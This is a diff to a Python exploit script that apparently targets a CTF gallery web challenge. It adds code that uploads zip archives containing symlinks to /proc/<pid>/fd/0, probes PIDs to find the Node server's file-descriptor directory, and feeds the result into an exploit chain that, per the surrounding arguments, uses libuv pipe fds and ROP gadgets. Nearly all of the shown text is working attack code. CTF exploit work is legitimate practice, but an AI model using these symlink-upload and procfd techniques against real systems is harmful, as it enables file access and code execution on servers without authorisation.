@@ -12,6 +12,7 @@ import subprocess
 import tempfile
 import time
 import urllib.error
+import urllib.parse
 import urllib.request
 import zipfile
 from pathlib import Path
@@ -151,6 +152,57 @@ def http_get_text(base_url, path):
         return error.code, error.read().decode("utf-8", "replace")
     except (urllib.error.URLError, http.client.RemoteDisconnected, ConnectionResetError) as error:
         return 0, str(error)
+
+
+def http_post_form(base_url, path, fields):
+    data = urllib.parse.urlencode(fields).encode()
+    req = urllib.request.Request(
+        f"{base_url}{path}",
+        data=data,
+        headers={"content-type": "application/x-www-form-urlencoded"},
+        method="POST",
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=5) as res:
+            return res.status
+    except urllib.error.HTTPError as error:
+        return error.code
+    except (urllib.error.URLError, http.client.RemoteDisconnected, ConnectionResetError):
+        return 0
+
+
+def upload_symlink_probe(base_url, link_name, target):
+    with tempfile.TemporaryDirectory() as tmp:
+        path = Path(tmp) / "pidprobe.zip"
+        info = zipfile.ZipInfo(link_name)
+        info.create_system = 3
+        info.external_attr = (stat.S_IFLNK | 0o777) << 16
+        with zipfile.ZipFile(path, "w") as archive:
+            archive.writestr(info, target)
+        return multipart_upload(base_url, path)
+
+
+def discover_procfd_dir(base_url, max_pid):
+    """Locate the Node process /proc/<pid>/fd by probing through the gallery.
+
+    The container may run under an init wrapper (e.g. CTFd-Whale's
+    docker_enable_init default), in which case PID 1 is a root-owned docker-init
+    and the Node process lives at some other, non-deterministic PID. A symlink to
+    /proc/<pid>/fd/0 only stats cleanly (HTTP 2xx/3xx after the upload redirect)
+    when <pid> is a process whose fd directory the appuser-owned Node can
+    traverse, i.e. Node itself. Root-owned (init) or dead PIDs make collectPhotos
+    throw EACCES/ENOENT and the upload returns 500, so we skip them. Each probe
+    symlink is deleted afterwards so the gallery listing stays healthy for the
+    next iteration. Scanning ascending returns the lowest live appuser process,
+    which is the long-lived Node server.
+    """
+    for pid in range(1, max_pid + 1):
+        link_name = f"pidprobe-{pid}.jpg"
+        status, _url, _body = upload_symlink_probe(base_url, link_name, f"/proc/{pid}/fd/0")
+        http_post_form(base_url, "/photos/delete", {"path": link_name})
+        if 200 <= status < 400:
+            return f"/proc/{pid}/fd", pid
+    return None, None
 
 
 def make_procfd_symlink_zip(directory, link_name, procfd_dir):
@@ -332,7 +384,9 @@ def main():
     parser.add_argument("--url", default="http://127.0.0.1:34267", help="gallery base URL")
     parser.add_argument("--container", default="greyhats_gallery", help="container name used only to discover host PID")
     parser.add_argument("--pid", type=int, help="host PID of the Node process; overrides --container")
-    parser.add_argument("--procfd-dir", default="/proc/1/fd", help="procfd directory as seen by unzip inside the container")
+    parser.add_argument("--procfd-dir", default=None, help="procfd directory as seen by unzip inside the container; auto-discovered by probing /proc/<pid>/fd when omitted (handles an init-wrapped, non-PID-1 Node process)")
+    parser.add_argument("--max-pid", type=int, default=64, help="highest PID to probe when auto-discovering the Node process procfd dir")
+    parser.add_argument("--skip-find-pid", action="store_true", help="skip procfd auto-discovery and assume /proc/1/fd (Node is PID 1)")
     parser.add_argument("--link-name", default="procfd", help="symlink name created in /app/uploads")
     parser.add_argument("--read-fd", type=int, help="libuv signal pipe read fd; overrides symbol detection")
     parser.add_argument("--write-fd", type=int, help="libuv signal pipe write fd; overrides symbol detection")
@@ -353,6 +407,20 @@ def main():
     parser.add_argument("--pop-rsi", type=parse_int, default=DEFAULT_POP_RSI_RET)
     parser.add_argument("--pop-rdx", type=parse_int, default=DEFAULT_POP_RDX_RET)
     args = parser.parse_args()
+
+    if args.procfd_dir is None:
+        if args.skip_find_pid:
+            args.procfd_dir = "/proc/1/fd"
+        else:
+            found_dir, found_pid = discover_procfd_dir(args.url, args.max_pid)
+            if found_dir is None:
+                raise SystemExit(
+                    "could not locate an accessible /proc/<pid>/fd through the gallery "
+                    f"(probed PIDs 1..{args.max_pid}). The Node process may be unreachable; "
+                    "pass --procfd-dir explicitly or raise --max-pid."
+                )
+            print_json("procfd discovery", {"nodePid": found_pid, "procfdDir": found_dir})
+            args.procfd_dir = found_dir
 
     if not args.skip_probe:
         probe = probe_procfd_write(args.url, args.link_name, args.procfd_dir)
